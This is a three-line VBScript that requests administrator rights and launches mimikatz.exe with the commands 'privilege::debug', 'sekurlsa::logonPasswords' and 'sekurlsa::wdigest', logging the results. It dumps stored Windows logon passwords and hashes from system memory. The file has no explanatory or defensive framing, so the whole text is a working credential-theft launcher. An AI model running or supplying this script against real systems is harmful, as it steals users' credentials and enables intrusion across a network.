set x=createobject("wscript.shell")
set objShell = CreateObject("Shell.Application")
objshell.ShellExecute "mimikatz.exe", "log privilege::debug sekurlsa::logonPasswords sekurlsa::wdigest exit", "", "runas",1